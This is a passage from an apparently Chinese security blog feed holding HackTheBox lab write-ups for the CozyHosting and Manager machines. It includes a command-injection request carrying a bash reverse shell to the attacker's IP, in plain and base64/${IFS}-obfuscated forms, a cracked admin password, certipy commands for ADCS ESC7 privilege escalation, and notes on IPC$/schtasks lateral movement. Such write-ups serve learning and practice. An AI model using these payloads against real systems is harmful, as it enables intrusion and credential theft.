class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 6:30&quot;</span>&#125;,<span class="attr">&quot;spring.jpa.hibernate.ddl-auto&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 7:31&quot;</span>&#125;,<span class="attr">&quot;spring.jpa.database&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 8:21&quot;</span>&#125;,<span class="attr">&quot;spring.datasource.platform&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 9:28&quot;</span>&#125;,<span class="attr">&quot;spring.datasource.url&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 10:23&quot;</span>&#125;,<span class="attr">&quot;spring.datasource.username&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 11:28&quot;</span>&#125;,<span class="attr">&quot;spring.datasource.password&quot;</span>:&#123;<span class="attr">&quot;value&quot;</span>:<span class="string">&quot;******&quot;</span>,<span class="attr">&quot;origin&quot;</span>:<span class="string">&quot;class path resource [application.properties] from cloudhosting-0.0.1.jar - 12:28&quot;</span>&#125;&#125;&#125;]&#125;</span><br></pre></td></tr></table></figure><p>看起来是springboot的一些配置信息，但是有一部分敏感信息被隐藏了。</p><p>访问：<a href="http://cozyhosting.htb/actuator/sessions，得到：">http://cozyhosting.htb/actuator/sessions，得到：</a></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;11EA9ABF8E82A3265404CDDD74627096&quot;</span>:<span class="string">&quot;kanderson&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>得到一个session值，直接换cookie值后成功登录到后台：</p><p><img src="https://s2.loli.net/2024/02/05/4z5Stk8m3ur1JgE.png" alt=""></p><p>然后有个目测是ssh连接工具：</p><p><img src="https://s2.loli.net/2024/02/05/gGZhF38sNCrt6lH.png" alt=""></p><p>抓包测了一下，考虑命令执行：</p><p><img src="https://s2.loli.net/2024/02/05/Ll3x7R6JAaEnStw.png" alt=""></p><p>成功注入命令：</p><p><img src="https://s2.loli.net/2024/02/05/8cd42emUilKtEas.png" alt=""></p><p>下面考虑反弹shell，payload如下：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/executessh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>cozyhosting.htb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>75</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://cozyhosting.htb</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://cozyhosting.htb/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=9C4072420CCA1097DD55FEA5A0F82D6A</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">host=10.10.11.230&amp;username=`ls`;`bash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1`;</span><br></pre></td></tr></table></figure><p>响应：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">302</span> </span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.18.0 (Ubuntu)</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 05 Feb 2024 13:01:55 GMT</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Location</span><span class="punctuation">: </span>http://cozyhosting.htb/admin?error=Username can&#x27;t contain whitespaces!</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Content-Type-Options</span><span class="punctuation">: </span>nosniff</span><br><span class="line"><span class="attribute">X-XSS-Protection</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache, no-store, max-age=0, must-revalidate</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Expires</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>DENY</span><br></pre></td></tr></table></figure><p>应该是过滤了空格，用${IFS}绕过，然后再base64 encode然后再url encode，万无一失payload如下：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/executessh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>cozyhosting.htb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>132</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://cozyhosting.htb</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://cozyhosting.htb/admin</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=9C4072420CCA1097DD55FEA5A0F82D6A</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line">host=10.10.11.230&amp;username=`ls`;`echo$&#123;IFS&#125;&quot;YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC43LzQ0NDQgMD4mMQo%3d&quot;|base64$&#123;IFS&#125;-d|bash%3b`%3b</span><br></pre></td></tr></table></figure><p>成功反弹shell，然后发现home里有一个josh用户：</p><p><img src="https://s2.loli.net/2024/02/05/ebZkJWqI72SORfV.png" alt=""></p><p>找了一圈没找到flag，可能还要分析jar包，起个http server，然后把jar包打到本地分析：</p><p><img src="https://s2.loli.net/2024/02/05/IbtShHODZuWg8k4.png" alt=""></p><p>jadx分析，在配置文件中找到了postgres的用户名和密码，并且数据库是cozyhosting：</p><p><img src="https://s2.loli.net/2024/02/05/WZFgnBtxMTRC7sh.png" alt=""></p><p>但是nmap的时候没有发现postgres的服务，猜测可能是本地服务，在反弹shell的机器上连接数据库，然后找了一圈发现用户表里面有两个用户：</p><figure class="highlight postgresql"><table><tr><td class="code"><pre><span class="line">kanderson | <span class="meta">$2</span>a<span class="meta">$10</span>$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | <span class="keyword">User</span></span><br><span class="line"><span class="keyword">admin</span>     | <span class="meta">$2</span>a<span class="meta">$10</span>$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | <span class="keyword">Admin</span></span><br></pre></td></tr></table></figure><p>其中kanderson在jadx的resource里面能找到密码，ssh了一下发现连不上，然后尝试跑下admin的密码：</p><p><img src="https://s2.loli.net/2024/02/05/cAYa9V3ZHNnuLSt.png" alt=""></p><p>跑好久才能跑出来，跑出来是manchesterunited，然后ssh连下：</p><p><img src="https://s2.loli.net/2024/02/05/9g7MoAWiq58GT6h.png" alt=""></p><p>成功拿到user flag。</p><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p>准备提权，找SUID的文件：</p><p><img src="https://s2.loli.net/2024/02/05/6iqxMheZokmPIaL.png" alt=""></p><p>发现有sudo，看下sudo -l：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">josh@cozyhosting:/$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> josh:</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> josh on localhost:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User josh may run the following commands on localhost:</span><br><span class="line">    (root) /usr/bin/ssh *</span><br></pre></td></tr></table></figure><p>有ssh，搜了一下ssh的提权方法，涨姿势了：</p><p><img src="https://s2.loli.net/2024/02/05/tMvwDXGR7dl4mVh.png" alt=""></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>最简单的一集，但是学到了sudo滥用 + ssh提权的姿势。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>假期打靶第一弹-Manager</title>
      <link href="2024/02/02/hackthebox-machine-manager/"/>
      <url>2024/02/02/hackthebox-machine-manager/</url>
      
        <content type="html"><![CDATA[<p>HTB，启动！</p><p>靶机地址：<a href="https://app.hackthebox.com/machines/Manager">https://app.hackthebox.com/machines/Manager</a></p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><p>拿到ip地址，先nmap乱扫一遍：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 987 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE           VERSION</span><br><span class="line">53/tcp   open  domain            Simple DNS Plus</span><br><span class="line">80/tcp   open  http              Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: Manager</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-02-02 21:18:46Z)</span><br><span class="line">135/tcp  open  msrpc             Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.manager.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb</span><br><span class="line">| Not valid before: 2023-07-30T13:51:28</span><br><span class="line">|_Not valid after:  2024-07-29T13:51:28</span><br><span class="line">|_ssl-date: 2024-02-02T21:20:27+00:00; +7h00m00s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.manager.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb</span><br><span class="line">| Not valid before: 2023-07-30T13:51:28</span><br><span class="line">|_Not valid after:  2024-07-29T13:51:28</span><br><span class="line">1433/tcp open  ms-sql-s          Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2024-02-02T12:29:19</span><br><span class="line">|_Not valid after:  2054-02-02T12:29:19</span><br><span class="line">|_ssl-date: 2024-02-02T21:20:27+00:00; +6h59m59s from scanner time.</span><br><span class="line">|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_ms-sql-info: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.manager.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb</span><br><span class="line">| Not valid before: 2023-07-30T13:51:28</span><br><span class="line">|_Not valid after:  2024-07-29T13:51:28</span><br><span class="line">|_ssl-date: 2024-02-02T21:20:28+00:00; +6h59m57s from scanner time.</span><br><span class="line">3269/tcp open  globalcatLDAPssl?</span><br><span class="line">| ssl-cert: Subject: commonName=dc01.manager.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb</span><br><span class="line">| Not valid before: 2023-07-30T13:51:28</span><br><span class="line">|_Not valid after:  2024-07-29T13:51:28</span><br><span class="line">|_ssl-date: 2024-02-02T21:20:25+00:00; +7h00m00s from scanner time.</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2019 (89%)</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2019 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m59s, deviation: 1s, median: 6h59m59s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-02-02T21:19:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 139/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   383.31 ms 10.10.14.1 (10.10.14.1)</span><br><span class="line">2   384.80 ms 10.10.11.236 (10.10.11.236)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 123.99 seconds</span><br></pre></td></tr></table></figure><p>发现开放了http、sqlserver等服务，还是个域控，域名是dc01.manager.htb。</p><p>web界面如下，目测是个静态页面：</p><p><img src="https://s2.loli.net/2024/02/02/sLRNkGuSno6bm3W.png" alt=""></p><p>先扫一波看看：</p><p><img src="https://s2.loli.net/2024/02/02/aT9BDxbiM7XVmWR.png" alt=""></p><p>啥也没有，那web打点的思路先放一下，跑下smb：</p><p><img src="https://s2.loli.net/2024/02/03/xZQL46bPjTX7Khg.png" alt=""></p><p>然后密码喷涂：</p><p><img src="https://s2.loli.net/2024/02/03/eRGzixoYSI9hkvr.png" alt=""></p><p>尝试列出共享目录：</p><p><img src="https://s2.loli.net/2024/02/03/9zSBr17QhyWcR4K.png" alt=""></p><p>用刚才喷涂出来的凭据登录之后啥都没有：</p><p><img src="https://s2.loli.net/2024/02/03/S1hutn7pb5weK6M.png" alt=""></p><p>所以445端口暂时也没什么思路了，但是有用的是我们跑出来了两个用户名和密码，现在还有mssql服务，可以尝试渗透，再进行一次密码喷涂：</p><p><img src="https://s2.loli.net/2024/02/03/1qjCp3efDwP2ScY.png" alt=""></p><p>有戏，登录进去看看：</p><p><img src="https://s2.loli.net/2024/02/03/ghcVODQrkFlaPGx.png" alt=""></p><p>发现没有数据库，首先想到的肯定是命令执行，想通过xp_cmdshell执行命令发现没有权限：</p><p><img src="https://s2.loli.net/2024/02/03/gK2LNy5Z6rtvDfI.png" alt=""></p><p>文章：<a href="http://www.bmth666.cn/2023/08/06/MSSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/">http://www.bmth666.cn/2023/08/06/MSSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A9%E7%94%A8/</a></p><p>可以利用mssql去列出目录：<code>EXEC master.sys.xp_dirtree &#39;C:\&#39;, 1, 1;</code></p><p>最终找到web目录下的一份源码，可以下载到本地，发现是个静态网站。</p><p>找到个配置文件：</p><p><img src="https://s2.loli.net/2024/02/03/OGslJY6RMWcbiwT.png" alt=""></p><p>nmap中扫描开放了WinRM服务，尝试连下，凭证就是刚才xml中的内容，成功拿到flag：</p><p><img src="https://s2.loli.net/2024/02/03/ar19cTkXe2Dwxg8.png" alt=""></p><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>查看下用户组，发现当前用户在Certificate Service DCOM Access组中，并且提供CA服务，这波是DC上放CA，彳亍。</p><p><img src="https://s2.loli.net/2024/02/03/uCzsgnLI8GBU2kW.png" alt=""></p><p>被搅屎了，第二天重置靶机后用certipy检测：</p><p><img src="https://s2.loli.net/2024/02/04/MxNIBUzLlPpFKCT.png" alt=""></p><p>检测出ESC7，下面是关于此的描述：</p><blockquote><h4 id="ESC7"><a href="#ESC7" class="headerlink" title="ESC7"></a>ESC7</h4><p>ESC7 is when a user has the <code>Manage CA</code> or <code>Manage Certificates</code> access right on a CA. There are no public techniques that can abuse the <code>Manage Certificates</code> access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests.</p><p>The <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">“Certified Pre-Owned”</a> whitepaper mentions that this access right can be used to enable the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag to perform the ESC6 attack, but this will not have any effect until the CA service (<code>CertSvc</code>) is restarted. When a user has the <code>Manage CA</code> access right, the user is also allowed to restart the service. However, it does not mean that the user can restart the service remotely.  Furthermore, ESC6 might not work out of the box in most patched  environments due to the May 2022 security updates.</p><p>Instead, I’ve found another technique that doesn’t require any service restarts or configuration changes.</p><p><strong>Prerequisites</strong></p><p>In order for this technique to work, the user must also have the <code>Manage Certificates</code> access right, and the certificate template <code>SubCA</code> must be enabled. With the <code>Manage CA</code> access right, we can fulfill these prerequisites.</p><p>The technique relies on the fact that users with the <code>Manage CA</code> <em>and</em> <code>Manage Certificates</code> access right can issue failed certificate requests. The <code>SubCA</code> certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the <code>SubCA</code> - which will be denied - but then issued by the manager afterwards.</p><p>If you only have the <code>Manage CA</code> access right, you can grant yourself the <code>Manage Certificates</code> access right by adding your user as a new officer.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy ca -ca &#39;corp-DC-CA&#39; -add-officer john -username john@corp.local -password Passw0rd</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Successfully added officer &#39;John&#39; on &#39;corp-DC-CA&#39;</span><br></pre></td></tr></table></figure><p>​    </p><p>The <code>SubCA</code> template can be enabled on the CA with the <code>-enable-template</code> parameter. By default, the <code>SubCA</code> template is enabled.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy ca -ca &#39;corp-DC-CA&#39; -enable-template SubCA -username john@corp.local -password Passw0rd</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Successfully enabled &#39;SubCA&#39; on &#39;corp-DC-CA&#39;</span><br></pre></td></tr></table></figure><p><strong>Attack</strong></p><p>If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the <code>SubCA</code> template.</p><p>This request will be denied, but we will save the private key and note down the request ID.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Requesting certificate via RPC</span><br><span class="line">&gt;[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.</span><br><span class="line">&gt;[*] Request ID is 785</span><br><span class="line">&gt;Would you like to save the private key? (y&#x2F;N) y</span><br><span class="line">&gt;[*] Saved private key to 785.key</span><br><span class="line">&gt;[-] Failed to request certificate</span><br></pre></td></tr></table></figure><p>​    </p><p>With our <code>Manage CA</code> and <code>Manage Certificates</code>, we can then issue the failed certificate request with the <code>ca</code> command and the <code>-issue-request &lt;request ID&gt;</code> parameter.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy ca -ca &#39;corp-DC-CA&#39; -issue-request 785 -username john@corp.local -password Passw0rd</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Successfully issued certificate</span><br></pre></td></tr></table></figure><p>​    </p><p>And finally, we can retrieve the issued certificate with the <code>req</code> command and the <code>-retrieve &lt;request ID&gt;</code> parameter.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785</span><br><span class="line">&gt;Certipy v4.0.0 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">&gt;[*] Rerieving certificate with ID 785</span><br><span class="line">&gt;[*] Successfully retrieved certificate</span><br><span class="line">&gt;[*] Got certificate with UPN &#39;administrator@corp.local&#39;</span><br><span class="line">&gt;[*] Certificate has no object SID</span><br><span class="line">&gt;[*] Loaded private key from &#39;785.key&#39;</span><br><span class="line">&gt;[*] Saved certificate and private key to &#39;administrator.pfx&#39;</span><br></pre></td></tr></table></figure></blockquote><p>首先创建一个officer，然后启用证书模板并请求证书，该请求将被拒绝，但我们将保存私钥并记下请求 ID：</p><p><img src="https://s2.loli.net/2024/02/04/IR7GWczvjwOpEQ3.png" alt=""></p><p>签发所请求的证书，然后可以检索证书（签发过程可能失败，重试两次即可，但注意要保证证书的id一致）：</p><p><img src="https://s2.loli.net/2024/02/04/hLBz6J2tw4gqGmv.png" alt=""></p><p>然后证书传递，生成一个Kerberos TGT票据和administrator的hash：</p><p><img src="https://s2.loli.net/2024/02/04/5vLxQOmZkbXwJjA.png" alt=""></p><p>报错了，需要先和dc同步下时钟：</p><p><img src="https://s2.loli.net/2024/02/04/wOzoNXE1jrmTf3P.png" alt=""></p><p>拿到管理员的hash值：</p><p><img src="https://s2.loli.net/2024/02/04/FC3QUljtgRo4snM.png" alt=""></p><p>利用hash登录账户后，提权成功，拿到root flag：</p><p><img src="https://s2.loli.net/2024/02/04/HWE3hq2F9zXe7KL.png" alt=""></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>一个内网渗透的小总结笔记：</p><p>一般内网渗透首先要搜集基本信息，来判断当前服务器的角色、网络环境等信息：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo <span class="comment">#详细信息</span></span><br><span class="line">net <span class="built_in">start</span> <span class="comment">#启动服务</span></span><br><span class="line">tasklist <span class="comment">#进程列表</span></span><br><span class="line">schtasks <span class="comment">#计划任务</span></span><br></pre></td></tr></table></figure><p>然后收集网络架构相关信息：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig /all <span class="comment"># 判断存在域-dns</span></span><br><span class="line">net view /domain <span class="comment"># 判断存在域</span></span><br><span class="line">net time /domain <span class="comment"># 判断主域</span></span><br><span class="line">netstat <span class="literal">-ano</span> <span class="comment"># 当前网络端口开放</span></span><br><span class="line">nslookup <span class="comment"># 域名解析</span></span><br></pre></td></tr></table></figure><p>系统默认的用户身份：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Domain Admins：域管理员（默认对域控制器有完全控制权）</span><br><span class="line">Domain Computers：域内机器</span><br><span class="line">Domain Controllers：域控制器</span><br><span class="line">Domain Guest：域访客，权限低</span><br><span class="line">Domain Users：域用户</span><br><span class="line">Enterprise Admins：企业系统管理员用户（默认对域控制器有完全控制权）</span><br></pre></td></tr></table></figure><p>用户身份查询：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">whoami /all 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net user 本地用户</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net user /domain 获取域用户信息</span><br><span class="line">net <span class="built_in">group</span> /domain 获取域用户组信息</span><br><span class="line">wmic useraccount get /all 涉及域用户详细信息</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain 查询域管理员账户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Enterprise Admins&quot;</span> /domain 查询管理员用户组</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain 查询域控制器</span><br></pre></td></tr></table></figure><p>常见的凭据信息收集：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.站点源码备份文件、数据库备份文件等</span><br><span class="line">2.各类数据库 Web 管理入口，如 PHPMyAdmin</span><br><span class="line">3.浏览器保存密码、浏览器 Cookies</span><br><span class="line">4.其他用户会话、3389 和 ipc$连接记录、回收站内容</span><br><span class="line">5.Windows 保存的 WIFI 密码</span><br><span class="line">6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等</span><br></pre></td></tr></table></figure><p>横向渗透明文传递的手法：拿到一台主机后，通过本地信息收集用户凭证，可以利用at和schtasks等横向渗透。</p><p>利用流程：</p><ol><li>建立 IPC 链接到目标主机</li><li>拷贝要执行的命令脚本到目标主机</li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li><li>删除 IPC 链接</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net use \\server\ipc<span class="variable">$</span><span class="string">&quot;password&quot;</span> /user:username <span class="comment"># 工作组</span></span><br><span class="line">net use \\server\ipc<span class="variable">$</span><span class="string">&quot;password&quot;</span> /user:domain\username <span class="comment">#域内</span></span><br><span class="line"><span class="built_in">dir</span> \\xx.xx.xx.xx\C<span class="variable">$</span>\ <span class="comment"># 查看文件列表</span></span><br><span class="line"><span class="built_in">copy</span> \\xx.xx.xx.xx\C<span class="variable">$</span>\<span class="number">1</span>.bat <span class="number">1</span>.bat <span class="comment"># 下载文件</span></span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.bat \\xx.xx.xx.xx\C<span class="variable">$</span> <span class="comment"># 复制文件</span></span><br><span class="line">net use \\xx.xx.xx.xx\C<span class="variable">$</span>\<span class="number">1</span>.bat /<span class="built_in">del</span> <span class="comment"># 删除 IPC</span></span><br><span class="line">net view xx.xx.xx.xx <span class="comment"># 查看对方共享</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#at &lt; Windows2012</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.21</span>\ipc<span class="variable">$</span> <span class="string">&quot;Admin12345&quot;</span> /user:god.org\ad</span><br><span class="line">ministrator <span class="comment"># 建立 ipc 连接：</span></span><br><span class="line"><span class="built_in">copy</span> add.bat \\<span class="number">192.168</span>.<span class="number">3.21</span>\c<span class="variable">$</span> <span class="comment">#拷贝执行文件到目标机器</span></span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">3.21</span> <span class="number">15</span>:<span class="number">47</span> c:\add.bat <span class="comment">#添加计划任务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#schtasks &gt;=Windows2012</span></span><br><span class="line">net use \\<span class="number">192.168</span>.<span class="number">3.32</span>\ipc<span class="variable">$</span> <span 